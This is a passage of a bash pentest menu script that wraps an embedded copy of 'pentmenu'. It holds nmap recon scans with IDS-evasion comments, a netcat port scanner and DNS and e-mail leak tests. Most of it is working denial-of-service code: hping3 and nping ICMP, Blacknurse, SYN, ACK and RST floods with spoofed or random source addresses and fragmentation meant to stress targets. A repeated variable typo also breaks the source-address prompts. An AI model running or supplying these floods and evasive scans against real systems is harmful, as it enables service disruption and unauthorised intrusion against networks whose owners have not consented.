[yY] | [yY][eE][sS])
	read_all ENTER IP OR WEB SITE NAME AND PRESS [ENTER] ; n_ip=${r_a}
	read_all ENTER PORT RANGE FOR SCAN AND PRESS [ENTER] ; range_port=${r_a}
	reset_broken
	for (( PORT = 1; PORT < $range_port; ++PORT )); do
		nc -z -w 1 "$n_ip" "$PORT" < /dev/null;
		if [ $? -eq 0 ]; then
			echo -ne "${green}Open port $PORT${clear}\033[0K\r\n"
		elif [ $broken -eq 1 ]; then
			break
		fi
	done & displaySpinner Scan in progress Please wait... && echo -ne "\n" ;;
[nN] | [nN][oO])
	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ; croc_recon ;;
*)
	invalid_entry ; target_port ;;
esac
}
##
#----Recon SSL/TLS SSLScan
##
ssl_scan() {
	clear
	echo -ne "$(Info_Screen '
-Scanning TLS/SSL configuration with SSLscan
-SSLscan is a command-line tool example: sslscan google.com:443
-Requirements: SSLSCAN')\n\n"
	install_package sslscan SSLSCAN ssl_scan croc_recon
	scan_all ssl_scan sslscan --no-failed
}
##
#----Recon phone number lookup
##
phone_lookup() {
	echo -ne "$(Info_Screen '
-Phone number lookup 555-555-5555
-curl https://www.phonelookup.com')\n\n"
user_agent_random
read_all ENTER PHONE NUMBER TO LOOKUP AND PRESS [ENTER]
curl -sk -A "$userAgent" https://www.phonelookup.com/1/${r_a} | grep -e "h[14]" | head -n14 | sed -e "s/^\s*//" -e "s/\s*$//" -e "s/<[^>]*>//g" | sed '1c\ '
}
##
#----Recon check dns leak test
##
leak_dns() {
	echo -ne "$(Info_Screen '
-DNS leak test
-Author: macvk https://github.com/macvk/dnsleaktest
-The test shows DNS leaks and your external IP.
-If you use the same ASN for DNS and connection - you have no
leak, otherwise here might be a problem.
-BY https://bash.ws/')\n\n"
local api_domain='bash.ws'
local error_code=1
increment_error_code() {
	error_code=$((error_code + 1))
}
echo_bold() {
	echo -e "${yellow}${1}${clear}"
}
echo_error() {
	(>&2 echo -e "${red}${1}${clear}")
}
program_exit() {
	command -v $1 > /dev/null
if [ $? -ne 0 ]; then
	echo_error "Please, install \"$1\""
	$error_code
fi
	increment_error_code
}
check_internet_connection() {
	user_agent_random
	curl -k -A "$userAgent" --silent --head --request GET "https://${api_domain}" | grep "200 OK" > /dev/null
if [ $? -ne 0 ]; then
	echo_error "No internet connection."
	$error_code
fi
	increment_error_code
}
program_exit curl
program_exit ping
check_internet_connection
if command -v jq &> /dev/null; then
	jq_exists=1
else
	jq_exists=0
fi
if hash shuf 2>/dev/null; then
	id=$(shuf -i 1000000-9999999 -n 1)
else
	id=$(jot -w %i -r 1 1000000 9999999)
fi
for i in $(seq 1 10); do
	unset -f ping_alert && killall tcpdump 2> /dev/null
	ping -c 1 "${i}.${id}.${api_domain}" > /dev/null 2>&1
done
print_servers() {
if (( $jq_exists )); then
	echo ${result_json} | \
	jq --monochrome-output \
	--raw-output \
	".[] | select(.type == \"${1}\") | \"\(.ip)\(if .country_name != \"\" and .country_name != false then \" [\(.country_name)\(if .asn != \"\" and .asn != false then \" \(.asn)\" else \"\" end)]\" else \"\" end)\""
else
	while IFS= read -r line; do
		if [[ "$line" != *${1} ]]; then
		continue
		fi
		ip=$(echo $line | cut -d'|' -f 1)
		code=$(echo $line | cut -d'|' -f 2)
		country=$(echo $line | cut -d'|' -f 3)
		asn=$(echo $line | cut -d'|' -f 4)
		if [ -z "${ip// }" ]; then
		continue
		fi
		if [ -z "${country// }" ]; then
			echo "$ip"
		else
		if [ -z "${asn// }" ]; then
			echo "$ip [$country]"
		else
			echo "$ip [$country, $asn]"
		fi
		fi
	done <<< "$result_txt"
fi
}
if (( $jq_exists )); then
	result_json=$(curl -k --silent "https://${api_domain}/dnsleak/test/${id}?json")
else
	result_txt=$(curl -k --silent "https://${api_domain}/dnsleak/test/${id}?txt")
fi
dns_count=$(print_servers "dns" | wc -l)
echo_bold "Your IP:"
print_servers "ip"
echo ""
if [ ${dns_count} -eq "0" ];then
	echo_bold "No DNS servers found"
else
if [ ${dns_count} -eq "1" ];then
	echo_bold "You use ${dns_count} DNS server:"
else
	echo_bold "You use ${dns_count} DNS servers:"
fi
	print_servers "dns"
fi
echo ""
echo_bold "Conclusion:"
print_servers "conclusion"
}
##
#----Recon check e-mail leak test
##
email_leak() {
	echo -ne "$(Info_Screen '
-E-mail IP leak test
-Author: macvk https://github.com/macvk/emailleaktest
-Your IP can be exposed during email sending.
-The test analyzes mail headers and shows IP leaks.
-BY https://bash.ws/')\n\n"
local api_domain='bash.ws'
local error_code=1
increment_error_code() {
	error_code=$((error_code + 1))
}
echo_bold() {
	echo -e "${yellow}${1}${clear}"
}
echo_error() {
	(>&2 echo -e "${red}${1}${clear}")
}
program_exit() {
	command -v $1 > /dev/null
if [ $? -ne 0 ]; then
	echo_error "Please, install \"$1\""
	$error_code
fi
	increment_error_code
}
check_internet_connection() {
	user_agent_random
	curl -k -A "$userAgent" --silent --head --request GET "https://${api_domain}" | grep "200 OK" > /dev/null
if [ $? -ne 0 ]; then
	echo_error "No internet connection."
	$error_code
fi
	increment_error_code
}
print_servers() {
if (( $jq_exists )); then
	echo ${result} | \
	jq --monochrome-output \
	--raw-output \
	".[] | select(.type == \"${1}\") | \"\(.ip)\(if .country_name != \"\" and .country_name != false then \" [\(.country_name)\(if .asn != \"\" and .asn != false then \" \(.asn)\" else \"\" end)]\" else \"\" end)\""
else
	while IFS= read -r line; do
	if [[ "$line" != *${1} ]]; then
		continue
		fi
		ip=$(echo $line | cut -d'|' -f 1)
		code=$(echo $line | cut -d'|' -f 2)
		country=$(echo $line | cut -d'|' -f 3)
		asn=$(echo $line | cut -d'|' -f 4)
		if [ -z "${ip// }" ]; then
		continue
		fi
		if [ -z "${country// }" ]; then
			echo "$ip"
		else
		if [ -z "${asn// }" ]; then
			echo "$ip [$country]"
		else
			echo "$ip [$country, $asn]"
		fi
		fi
	done <<< "$result"
fi
}
program_exit curl
program_exit ping
program_exit mail
check_internet_connection
if command -v jq &> /dev/null; then
	jq_exists=1
else
	jq_exists=0
fi
if hash shuf 2>/dev/null; then
	id=$(shuf -i 1000000-9999999 -n 1)
else
	id=$(jot -w %i -r 1 1000000 9999999)
fi
if (( $jq_exists )); then
	format="json"
else
	format="txt"
fi
result=$(curl -k --silent "https://${api_domain}/email-leak-test/test/${id}?${format}")
mail -s "Test" ${id}@bash.ws < /dev/null > /dev/null
for (( ; ; ))
do
	result=$(curl -k --silent "https://${api_domain}/email-leak-test/test/${id}?${format}")
	is_done=$(print_servers "done")
if [[ $is_done == *"1"* ]]; then
	break
fi
done
echo_bold "Your IP:"
print_servers "ip"
echo ""
ips_count=$(print_servers "mail" | wc -l)
if [ ${ips_count} -eq "0" ];then
	echo_bold "No IPs found in mail header"
else
if [ ${ips_count} -eq "1" ];then
	echo_bold "Mail header has got ${ips_count} IP:"
else
	echo_bold "Mail header has got ${ips_count} IPs:"
fi
	print_servers "mail"
fi
echo ""
echo_bold "Conclusion:"
print_servers "conclusion"
}
##
#----Recon pentmenu dos flood attack & recon scans by Chris Spillane
##
pentmenu() {
	echo -ne "$(Info_Screen '
-Welcome to pentmenu!
Big thanks to Chris Spillane - GinjaChris, xorond, ayvdaualo
-This software is only for responsible, authorised use.
-YOU are responsible for your own actions!
-https://github.com/GinjaChris/pentmenu/blob/master/pentmenu
-Requirements:
-bash, curl, netcat, hping3 or nping, openssl, stunnel,
-nmap, whois, dnsutils, ike-scan')\n\n"
install_package whois WHOIS pentmenu
install_package host HOST pentmenu
install_package hping3 HPING3 pentmenu
install_package dnsutils DNSUTILS pentmenu
#install_package stunnel STUNNEL pentmenu
install_package ike-scan IKE-SCAN pentmenu
##
#----Recon pentmenu main menu
##
mainmenu() {
echo -ne "$(Info_Screen '
Welcome to
    ________  _______  _       _________ _______  _______  _                
   |  ____  ||  ____ \| \    /|\__   __/|  ___  ||  ____ \| \    /||\     /|
   | |    | || |    \/|  \  | |   | |   | || || || |    \/|  \  | || |   | |
   | |____| || |__    |   \ | |   | |   | || || || |__    |   \ | || |   | |
   |  ______||  __)   | |\ \| |   | |   | ||_|| ||  __)   | |\ \| || |   | |
   | |       | |      | | \   |   | |   | |   | || |      | | \   || |   | |
   | |       | |____/\| |  \  |   | |   | |   | || |____/\| |  \  || |___| |
   |/        (_______/|/    \_|   |_|   |/     \||_______/|/    \_||_______|

-Author: Chris Spillane - GinjaChris')\n\n"
MenuTitle PENTMENU MAIN MENU ; MenuColor 20 1 PENTMENU RECON MENU ; MenuColor 20 2 PENTMENU DOS MENU ; MenuColor 20 3 EXTRACTION MENU ; MenuColor 20 4 VIEW README ; MenuColor 20 5 RETURN TO MAIN MENU ; MenuEnd 23
	case $m_a in
	1) reconmenu ;; 2) dosmenu ;; 3) extractionmenu ;; 4) showreadme ;; 5) main_menu ;; [pP]) Panic_button ;; 0) exit 0 ;; [bB]) croc_recon ;; *) invalid_entry ; mainmenu ;;
	esac
}
##
#----Recon pentmenu recon menu
##
reconmenu() {
	echo -ne "$(Info_Screen '
-RECON MODULES
-Show IP uses curl to perform a lookup of your external IP.
-DNS Recon passive recon, performs a DNS lookup and whois lookup of the target.
-Ping Sweep nmap to perform ICMP echo (ping) against the target host or network.
-Quick Scan TCP Port scanner using nmap to scan open ports using TCP SYN scan.
-Detailed Scan uses nmap to identify live hosts, open ports, attempts OS id.
-UDP scan uses nmap to scan for open UDP ports. All UDP ports are scanned.
-Check Server Uptime on target by querying an open TCP port with hping3.
-IPsec Scan attempts to identify the presence of IPsec VPN server with ike-scan.')\n\n"
MenuTitle PENTMENU RECON SCAN MENU ; MenuColor 20 1 SHOW IP ; MenuColor 20 2 DNS RECON ; MenuColor 20 3 PING SWEEP ; MenuColor 20 4 QUICK SCAN ; MenuColor 20 5 DETAILED SCAN
MenuColor 20 6 UDP SCAN ; MenuColor 20 7 CHECK SERVER UPTIME ; MenuColor 20 8 IPsec SCAN ; MenuColor 20 9 RETURN TO MAIN MENU ; MenuEnd 23
	case $m_a in
	1) showip ; reconmenu ;; 2) dnsrecon ; reconmenu ;; 3) pingsweep ; reconmenu ;; 4) quickscan ; reconmenu ;; 5) detailedscan ; reconmenu ;; 6) udpscan ; reconmenu ;; 7) checkuptime ; reconmenu ;; 8) ipsecscan ; reconmenu ;; 9) mainmenu ;; [pP]) Panic_button ;; 0) exit 0 ;; [bB]) mainmenu ;; *) invalid_entry ; reconmenu ;;
	esac
}
##
#----Recon pentmenu input Target ip/host
##
target_input() {
	read_all ENTER TARGET HOSTNAME OR IP ; TARGET=${r_a}
}
##
#----Recon pentmenu input Target port
##
target_input_port() {
	read_all ENTER PORT DEFAULT IS 80 ; PORT=${r_a}
}
##
#----Recon pentmenu START SHOW IP
##
showip() {
echo -ne "$(Info_Screen '
External IP lookup uses curl...')\n\n"
user_agent_random
#---use curl to lookup external IP
echo -ne "${yellow}External IP is detected as:${clear} " ; curl -A "$userAgent" https://icanhazip.com/s/
#----show interface IP's
echo -ne "\n${yellow}Interface IP's are:${clear}\n"
	ip a | grep inet
#----if ip a command fails revert to ifconfig
if ! [[ $? = 0 ]]; then
	ifconfig | grep inet
fi
}
##
#----Recon pentmenu START DNS RECON
##
dnsrecon() {
echo -ne "$(Info_Screen '
-This module performs passive recon via forward/reverse name lookups
-for the target (as appropriate) and performs a whois lookup')\n\n"
#----need a target IP/hostname to check
	target_input
	host $TARGET
#----if host command doesnt work try nslookup instead
if ! [[ $? = 0 ]]; then
	nslookup $TARGET
fi
#----run a whois lookup on the target
sleep 1 && whois -H $TARGET
if ! [[ $? = 0 ]]; then
#----if whois fails, do a curl lookup to ipinfo.io
	user_agent_random
	sleep 1 && curl -A "$userAgent" ipinfo.io/$TARGET
fi
reconmenu
}
##
#----Recon pentmenu START PING SWEEP
##
pingsweep() {
echo -ne "$(Info_Screen '
-This module performs a simple ICMP echo 'ping' sweep')\n\n"
#----need to know the subnet to scan for live hosts using pings
target_input
#----this could be done with ping command, but that is extremely difficult to code in bash for unusual subnets so we use nmap instead
nmap -sP -PE $TARGET --reason
}
##
#----Recon pentmenu START QUICK SCAN
##
quickscan() {
echo -ne "$(Info_Screen '
-This module conducts a scan using nmap
-Depending on the target, the scan might take a long time to finish')\n\n"
#----we need to know where to scan. Whilst a hostname is possible, this module is designed to scan a subnet range
target_input
#----How fast should we scan the target?
#----Faster speed is more likely to be detected by IDS, but is less waiting around
echo -ne "\n\e[38;5;19;1;48;5;245mEnter the speed of scan (0 means very slow and 5 means fast).
Slower scans are more subtle, but faster means less waiting around.${clear}\n"
read_all Default is 3 ; SPEED=${r_a}
: ${SPEED:=3}
nmap -Pn -sS -T $SPEED $TARGET --reason
}
##
#----Recon pentmenu START DETAILED SCAN
##
detailedscan() {
echo -ne "$(Info_Screen '
-This module performs a scan using nmap
-This scan might take a very long time to finish, please be patient')\n\n"
#----need a target hostname/IP
target_input
#----How fast should we scan the target?
#----Faster speed is more likely to be detected by IDS, but is less waiting around
echo -ne "\n\e[38;5;19;1;48;5;245mEnter the speed of scan (0 means very slow and 5 means fast).
Slower scans are more subtle, but faster means less waiting around.${clear}\n"
read_all Default is 3 ; SPEED=${r_a}
: ${SPEED:=3}
#----scan using nmap. Note the change in user-agent from the default nmap value to help avoid detection
user_agent_random
nmap -script-args http.useragent="$userAgent" -Pn -p 1-65535 -sV -sC -A -O -T $SPEED $TARGET --reason
}
##
#----Recon pentmenu START UDP SCAN
##
udpscan() {
echo -ne "$(Info_Screen '
-It scans ALL ports on the target system. This may take some time, please be patient')\n\n"
#----need a target IP/hostname
target_input
#----How fast should we scan the target?
#----Faster speed is more likely to be detected by IDS, but is less waiting around
echo -ne "\n\e[38;5;19;1;48;5;245mEnter the speed of scan (0 means very slow and 5 means fast).
Slower scans are more subtle, but faster means less waiting around.${clear}\n"
read_all Default is 3 ; SPEED=${r_a}
: ${SPEED:=3}
#----launch the scan using nmap
nmap -Pn -p 1-65535 -sU -T $SPEED $TARGET --reason
}
##
#----Recon pentmenu START CHECK UPTIME
##
checkuptime() {
	echo -ne "$(Info_Screen '
-This module will attempt to estimate the uptime of a given server, using hping3
-This is not guaranteed to work')\n\n"
#----need a target IP/hostname
target_input
#----need a target port
target_input_port
: ${PORT:=80}
dos_port_check
#----how many times to retry the check?
read_all Retries? 3 is ideal and default, 2 might also work ; RETRY=${r_a}
: ${RETRY:=3}
echo -ne "\n${green}Starting..${clear}\n"
#----use hping3 and enable the TCP timestamp option, and try to guess the timestamp update frequency and the remote system uptime.
#----this might not work, but sometimes it does work very well
hping3 --tcp-timestamp -S $TARGET -p $PORT -c $RETRY | grep uptime
echo -ne "\n${green}Done.${clear}\n"
}
##
#----Recon pentmenu START IPSEC SCAN
##
#----we need to know where to scan
ipsecscan() {
target_input
#----Encryption algorithms: DES, Triple-DES, AES/128, AES/192 and AES/256
ENCLIST="1 5 7/128 7/192 7/256"
#----Hash algorithms: MD5, SHA1, SHA-256, SHA-384 and SHA-512
HASHLIST="1 2 4 5 6"
#----Authentication methods: Pre-Shared Key, RSA Signatures, Hybrid Mode and XAUTH
AUTHLIST="1 3 64221 65001"
#----Diffie-Hellman groups: 1, 2, 5 and 12
GROUPLIST="1 2 5 12"
for ENC in $ENCLIST; do
	for HASH in $HASHLIST; do
		for AUTH in $AUTHLIST; do
			for GROUP in $GROUPLIST; do
			echo "--trans=$ENC,$HASH,$AUTH,$GROUP" | xargs --max-lines=8 ike-scan --retry=1 -R -M $TARGET | grep -v "Starting" | grep -v "0 returned handshake; 0 returned notify"
			done
		done
	done
done
}
##
#----Recon pentmenu DOS menu
##
dosmenu() {
	echo -ne "$(Info_Screen '
-DOS MODULES
-ICMP Echo Flood hping3 launch a traditional ICMP Echo flood against the target.
-ICMP Blacknurse Flood hping3 to launch an ICMP flood against the target.
-TCP SYN Flood sends a flood of TCP SYN packets using hping3.
-TCP ACK Flood offers the same options as the SYN flood.
-TCP RST Flood offers the same options as the SYN flood, RST (Reset) TCP flag.
-TCP XMAS Flood similar to the SYN and ACK floods, with the same options.
-UDP Flood like TCP SYN Flood but instead sends UDP packets specified host:port.
-SSL DOS uses OpenSSL to attempt to DOS a target host:port.
-Slowloris - uses netcat to slowly send HTTP Headers to the target host:port.
-IPsec DOS ike-scan attempt to flood the specified IP with Main mode-Aggressive
-Distraction Scan not really a DOS attack but launches multiple TCP SYN scans.
-DNS NXDOMAIN Flood attack uses netcat and designed to stress test DNS server ')\n\n"
MenuTitle PENTMENU DOS FLOOD MENU ; MenuColor 21 1 ICMP ECHO FLOOD ; MenuColor 21 2 ICMP BLACKNURSE ; MenuColor 21 3 TCP SYN FLOOD ; MenuColor 21 4 TCP ACK FLOOD ; MenuColor 21 5 TCP RST FLOOD ; MenuColor 21 6 TCP XMAS FLOOD
MenuColor 21 7 UDP FLOOD ; MenuColor 21 8 SSL DOS ; MenuColor 21 9 SLOWLORIS ; MenuColor 20 10 IPsec DOS ; MenuColor 20 11 DISTRACTION SCAN ; MenuColor 20 12 DNS NXDOMAIN FLOOD ; MenuColor 20 13 RETURN TO MAIN MENU
MenuEnd 24
	case $m_a in
	1) icmpflood ; dosmenu ;; 2) blacknurse ; dosmenu ;; 3) synflood ; dosmenu ;; 4) ackflood ; dosmenu ;; 5) rstflood ; dosmenu ;; 6) xmasflood ; dosmenu ;; 7) udpflood ; dosmenu ;; 8) ssldos ; dosmenu ;;
	9) slowloris ; dosmenu ;; 10) ipsecdos ; dosmenu ;; 11) distractionscan ; dosmenu ;; 12) nxdomainflood ; dosmenu ;; 13) mainmenu ;; [pP]) Panic_button ;; 0) exit 0 ;; [bB]) mainmenu ;; *) invalid_entry ; dosmenu ;;
	esac
}
#----check a valid integer is given for the port, anything else is invalid
dos_port_check() {
if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
	PORT=80 && echo -ne "${red}Invalid port,${clear}${yellow} reverting to port 80${clear}\n"
elif [ "$PORT" -lt "1" ]; then
	PORT=80 && echo -ne "${red}Invalid port number chosen!${clear}${yellow} Reverting port 80${clear}\n"
elif [ "$PORT" -gt "65535" ]; then
	PORT=80 && echo -ne "${red}Invalid port chosen!${clear}${yellow} Reverting to port 80${clear}\n"
else
	echo -ne "${yellow}Using Port${clear}${green} $PORT${clear}\n"
fi
}
##
#----Recon pentmenu START ICMP FLOOD
##
icmpflood() {
	echo -ne "$(Info_Screen '
-Preparing to launch ICMP Echo Flood using hping3')\n\n"
#----need a target IP/hostname
	target_input
#----What source address to use? Manually defined, or random, or outgoing interface IP?
	read_all Enter Source IP, or [r]andom or [i]nterface IP default ; SOURE=${r_a}
	: ${SOURCE:=i}
if [[ "$SOURCE" =~ ${validate_ip} ]]; then
	echo -ne "${green}Starting ICMP echo Flood. Use 'Ctrl c' to end and return to menu${clear}\n"
	hping3 -1 --flood --spoof $SOURCE $TARGET
elif [ "$SOURCE" = "r" ]; then
	echo -ne "${green}Starting ICMP Echo Flood. Use 'Ctrl c' to end and return to menu${clear}\n"
	hping3 -1 --flood --rand-source $TARGET
elif [ "$SOURCE" = "i" ]; then
	echo -ne "${green}Starting ICMP Echo Flood. Use 'Ctrl c' to end and return to menu${clear}\n"
	hping3 -1 --flood $TARGET
else
	echo -ne "${red}Not a valid option!  Using interface IP${clear}\n"
	echo -ne "${green}Starting ICMP Echo Flood. Use 'Ctrl c' to end and return to menu${clear}\n"
	hping3 -1 --flood $TARGET
fi
}
##
#----Recon pentmenu START BLACK NURSE
##
blacknurse() {
	echo -ne "$(Info_Screen '
Preparing to launch ICMP Blacknurse Flood using hping3')\n\n"
#----need a target IP/hostname
	target_input
#----What source address to use? Manually defined, or random, or outgoing interface IP?
	read_all Enter Source IP, or [r]andom or [i]nterface IP default ; SOURE=${r_a}
	: ${SOURCE:=i}
if [[ "$SOURCE" =~ ${validate_ip} ]]; then
	echo -ne "${green}Starting Blacknurse Flood. Use 'Ctrl c' to end and return to menu${clear}\n"
	hping3 -1 -C 3 -K 3 --flood --spoof $SOURCE $TARGET
elif [ "$SOURCE" = "r" ]; then
	echo -ne "${green}Starting Blacknurse Flood. Use 'Ctrl c' to end and return to menu${clear}\n"
	hping3 -1 -C 3 -K 3 --flood --rand-source $TARGET
elif [ "$SOURCE" = "i" ]; then
	echo -ne "${green}Starting Blacknurse Flood. Use 'Ctrl c' to end and return to menu${clear}\n"
	hping3 -1 -C 3 -K 3 --flood $TARGET
else
	echo -ne "${red}Not a valid option!  Using interface IP${clear}"
	echo -ne "${green}Starting Blacknurse Flood. Use 'Ctrl c' to end and return to menu${clear}\n"
	hping3 -1 -C 3 -K 3 --flood $TARGET
fi
}
##
#----Recon pentmenu START TCP SYN FLOOD
##
synflood() {
	echo -ne "$(Info_Screen '
TCP SYN Flood uses hping3...checking for hping3...')\n\n"
if test -f "/usr/sbin/hping3"; then
	echo -ne "${green}hping3 found, continuing!${clear}\n";
#----hping3 is found, so use that for TCP SYN Flood
#----need a target IP/hostname
	target_input
#----need a port to send TCP SYN packets to
	target_input_port
	: ${PORT:=80}
	dos_port_check
#----What source address to use? Manually defined, or random, or outgoing interface IP?
	read_all Enter Source IP, or [r]andom or [i]nterface IP default ; SOURE=${r_a}
	: ${SOURCE:=i}
#----should any data be sent with the SYN packet? Default is to send no data
	read_all Send data with SYN packet? [y]es or [n]o default ; SENDDATA=${r_a}
	: ${SENDDATA:=n}
if [[ $SENDDATA = y ]]; then
#----we've chosen to send data, so how much should we send?
	read_all Enter number of data bytes to send default 3000 ; DATA=${r_a}
	: ${DATA:=3000}
#----If not an integer is entered, use default
if ! [[ "$DATA" =~ ^[0-9]+$ ]]; then
	DATA=3000 && echo -ne "${red}Invalid integer! ${clear}${green} Using data length of 3000 bytes${clear}\n"
fi
#----if $SENDDATA is not equal to y (yes) then send no data
else
	DATA=0
fi
#----note that virtual fragmentation is set.  The default for hping3 is 16 bytes.
#----fragmentation should therefore place more stress on the target system
if [[ "$SOURCE" =~ ${validate_ip} ]]; then
	echo -ne "${yellow}Starting TCP SYN Flood. Use 'Ctrl c' to end and return to menu${clear}\n"
	hping3 --flood -d $DATA --frag --spoof $SOURCE -p $PORT -S $TARGET
elif [ "$SOURCE" = "r" ]; then
	echo -ne "${green}Starting TCP SYN Flood. Use 'Ctrl c' to end and return to menu${clear}\n"
	hping3 --flood -d $DATA --frag --rand-source -p $PORT -S $TARGET
elif [ "$SOURCE" = "i" ]; then
	echo -ne "${green}Starting TCP SYN Flood. Use 'Ctrl c' to end and return to menu${clear}\n"
	hping3 -d $DATA --flood --frag -p $PORT -S $TARGET
else
	echo -ne "${red}Not a valid option!${clear}${yellow}  Using interface IP${clear}\n"
	echo -ne "${green}Starting TCP SYN Flood. Use 'Ctrl c' to end and return to menu${clear}\n"
	hping3 --flood -d $DATA --frag -p $PORT -S $TARGET
fi
#----No hping3 so using nping for TCP SYN Flood
else
	echo -ne "${red}hping3 not found :(${clear}${yellow} trying nping instead${clear}\n"
	echo -ne "${yellow}Trying TCP SYN Flood with nping..this will work but is not ideal${clear}\n"
#----need a valid target ip/hostname
target_input
#----need a valid target port
	target_input_port
	: ${PORT:=80}
	dos_port_check
#----define source IP or use outgoing interface IP
	read_all Enter Source IP or use [i]nterface IP default ; SOURCE=${r_a}
	: ${SOURCE:=i}
#----How many packets to send per second?  default is 10k
	read_all Enter number of packets to send per second default is 10,000 ; RATE=${r_a}
	: ${RATE:=10000}
#----default is 100k, so using default values will send 10k packets per second for 10 seconds
	read_all Enter total number of packets to send default is 100,000 ; TOTAL=${r_a}
	: ${TOTAL:=100000}
	echo -ne "\n${green}Starting TCP SYN Flood...${clear}\n"
#----begin TCP SYN flood using values defined earlier
if 	[ "$SOURCE" = "i" ]; then
	nping --tcp --dest-port $PORT --flags syn --rate $RATE -c $TOTAL -v-1 $TARGET
else
	nping --tcp --dest-port $PORT --flags syn --rate $RATE -c $TOTAL -v-1 -S $SOURCE $TARGET
fi
fi
}
##
#----Recon pentmenu START TCP ACK FLOOD
##
ackflood() {
	echo -ne "$(Info_Screen '
TCP ACK Flood uses hping3...checking for hping3...')\n\n"
if test -f "/usr/sbin/hping3"; then
	echo -ne "${green}hping3 found, continuing!${clear}\n";
#----hping3 is found, so use that for TCP ACK Flood
	target_input
#----need a port to send TCP ACK packets to
	target_input_port
	: ${PORT:=80}
	dos_port_check
#----What source address to use? Manually defined, or random, or outgoing interface IP?
	read_all Enter Source IP, or [r]andom or [i]nterface IP default ; SOURCE=${r_a}
	: ${SOURCE:=i}
#----should any data be sent with the ACK packet?  Default is to send no data
	read_all Send data with ACK packet? [y]es or [n]o default ; SENDDATA=${r_a}
	: ${SENDDATA:=n}
if [[ $SENDDATA = y ]]; then
#----we've chosen to send data, so how much should we send?
	read_all Enter number of data bytes to send default 3000 ; DATA=${r_a}
	: ${DATA:=3000}
#----If not an integer is entered, use default
if ! [[ "$DATA" =~ ^[0-9]+$ ]]; then
	DATA=3000 && echo -ne "\n${red}Invalid integer!${clear}${yellow} Using data length of 3000 bytes${clear}\n"
fi
#if $SENDDATA is not equal to y (yes) then send no data
else
	DATA=0
fi
#----start TCP ACK flood using values defined earlier
#----note that virtual fragmentation is set. The default for hping3 is 16 bytes.
#----fragmentation should therefore place more stress on the target system
if [[ "$SOURCE" =~ ${validate_ip} ]]; then
	echo -ne "${green}Starting TCP ACK Flood. Use 'Ctrl c' to end and return to menu${clear}\n"
	hping3 --flood -d $DATA --frag --spoof $SOURCE -p $PORT -A $TARGET
elif [ "$SOURCE" = "r" ]; then
	echo -ne "${green}Starting TCP ACK Flood. Use 'Ctrl c' to end and return to menu${clear}\n"
	hping3 --flood -d $DATA --frag --rand-source -p $PORT -A $TARGET
elif [ "$SOURCE" = "i" ]; then
	echo -ne "${green}Starting TCP ACK Flood. Use 'Ctrl c' to end and return to menu${clear}\n"
	hping3 -d $DATA --flood --frag -p $PORT -A $TARGET
else
	echo -ne "${red}Not a valid option!  Using interface IP\n"
	echo -ne "${green}Starting TCP ACK Flood. Use 'Ctrl c' to end and return to menu${clear}\n"
	hping3 --flood -d $DATA --frag -p $PORT -A $TARGET
fi
#----No hping3 so using nping for TCP ACK Flood
else
	echo -ne "${red}hping3 not found :(${clear}${yellow} trying nping instead${clear}\n"
	echo -ne "${yellow}Trying TCP ACK Flood with nping..this will work but is not ideal${clear}\n"
#----need a valid target ip/hostname
	target_input
#----need a valid target port
	target_input_port
	: ${PORT:=80}
	dos_port_check
#----define source IP or use outgoing interface IP
	read_all Enter Source IP or use [i]nterface IP default ; SOURE=${r_a}
	: ${SOURCE:=i}
#----How many packets to send per second?  default is 10k
	read_all Enter number of packets to send per second default is 10,000 ; RATE=${r_a}
	: ${RATE:=10000}
#----default is 100k, so using default values will send 10k packets per second for 10 seconds
	read_all Enter total number of packets to send default is 100,000 ; TOTAL=${r_a}
	: ${TOTAL:=100000}
	echo -ne "\n${green}Starting TCP ACK Flood...${clear}\n"
#----begin TCP ACK flood using values defined earlier
if [ "$SOURCE" = "i" ]; then
	nping --tcp --dest-port $PORT --flags ack --rate $RATE -c $TOTAL -v-1 $TARGET
else
	nping --tcp --dest-port $PORT --flags ack --rate $RATE -c $TOTAL -v-1 -S $SOURCE $TARGET
fi
fi
}
##
#----Recon pentmenu START TCP RST FLOOD
##
rstflood() {
	echo -ne "$(Info_Screen '
-TCP RST Flood uses hping3...checking for hping3...')\n\n"
if test -f "/usr/sbin/hping3"; then
	echo -ne "${green}hping3 found, continuing!${clear}\n";
#----hping3 is found, so use that for TCP RST Flood
	target_input
#----need a port to send TCP RST packets to
	target_input_port
	: ${PORT:=80}
	dos_port_check
#----What source address to use? Manually defined, or random, or outgoing interface IP?
	read_all Enter Source IP, or [r]andom or [i]nterface IP default ; SOURE=${r_a}
	: ${SOURCE:=i}
#----should any data be sent with the RST packet?  Default is to send no data
	read_all Send data with RST packet? [y]es or [n]o default ; SENDDATA=${r_a}
	: ${SENDDATA:=n}
if [[ $SENDDATA = y ]]; then
#----we've chosen to send data, so how much should we send?
	read_all Enter number of data bytes to send default 3000 ; DATA=${r_a}
	: ${DATA:=3000}
#----If not an integer is entered, use default
if ! [[ "$DATA" =~ ^[0-9]+$ ]]; then
	DATA=3000 && echo -ne "${red}Invalid integer!${clear}${yellow} Using data length of 3000 bytes${clear}\n"
fi
#----if $SENDDATA is not equal to y (yes) then send no data
else
	DATA=0
fi
#----start TCP RST flood using values defined earlier
#----note that virtual fragmentation is set.  The default for hping3 is 16 bytes.
#----fragmentation should therefore place more stress on the target system
if [[ "$SOURCE" =~ ${validate_ip} ]]; then
	echo -ne "${green}Starting TCP RST Flood. Use 'Ctrl c' to end and return to menu${clear}\n"
	hping3 --flood -d $DATA --frag --spoof $SOURCE -p $PORT -R $TARGET
elif [ "$SOURCE" = "r" ]; then
	echo -ne "${green}Starting TCP RST Flood. Use 'Ctrl c' to end and return to menu${clear}\n"
	hping3 --flood -d $DATA --frag --rand-source -p $PORT -R $TARGET
elif [ "$SOURCE" = "i" ]; then
	echo -ne "${green}Starting TCP RST Flood. Use 'Ctrl c' to end and return to menu${clear}\n"
	hping3 -d $DATA --flood --frag -p $PORT -R $TARGET
else
	echo -ne "${red}Not a valid option!  Using interface IP${clear}\n"
	echo -ne "${green}Starting TCP RST Flood. Use 'Ctrl c' to end and return to menu${clear}\n"
	hping3 --flood -d $DATA --frag -p $PORT -R $TARGET
fi
#----No hping3 so using nping for TCP RST Flood
else
	echo -ne "${red}hping3 not found :(${clear}${yellow} trying nping instead${clear}\n"
	echo -ne "${yellow}Trying TCP RST Flood with nping..this will work but is not ideal${clear}\n"
#----need a valid target ip/hostname
	target_input
#----need a valid target port
	target_input_port
	: ${PORT:=80}
	dos_port_check
#----define source IP or use outgoing interface IP
	read_all Enter Source IP or use [i]nterface IP default ; SOURE=${r_a}
